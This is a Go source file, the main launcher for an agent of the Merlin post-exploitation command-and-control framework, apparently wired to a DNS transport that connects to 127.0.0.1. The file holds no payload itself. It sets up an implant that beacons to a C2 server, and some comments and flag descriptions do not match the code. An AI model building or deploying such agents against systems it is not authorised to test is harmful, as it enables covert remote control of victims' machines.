// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	"github.com/Ne0nd0g/merlin/pkg/agent"
	"github.com/Ne0nd0g/merlin/pkg/transport/dns"

	// Standard
	"flag"
	"fmt"
	"os"
	"time"

	// 3rd Party
	"github.com/fatih/color"

	// Merlin
	merlin "github.com/Ne0nd0g/merlin/pkg"
)

// GLOBAL VARIABLES
var url = "127.0.0.1"
var build = "nonRelease"

func main() {
	verbose := flag.Bool("v", true, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", true, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	protocol := flag.String("ns", "127.0.0.1", "Protocol for the agent to connect with [h2, hq]")
	sleep := flag.Duration("sleep", 1000*time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", merlin.Version))
		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
		os.Exit(0)
	}

	// Setup and run agent
	//use http2 transport
	trnsprt := dns.DNSCommClient{}.New("dns", "", "aa")
	trnsprt.Host = url
	trnsprt.NS = "127.0.0.1"
	//agent.New
	a := agent.New(*protocol, *verbose, *debug, &trnsprt)
	a.WaitTime = *sleep
	a.PaddingMax = 5
	a.Run(url)
}

// usage prints command line options
func usage() {
	fmt.Printf("Merlin Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}
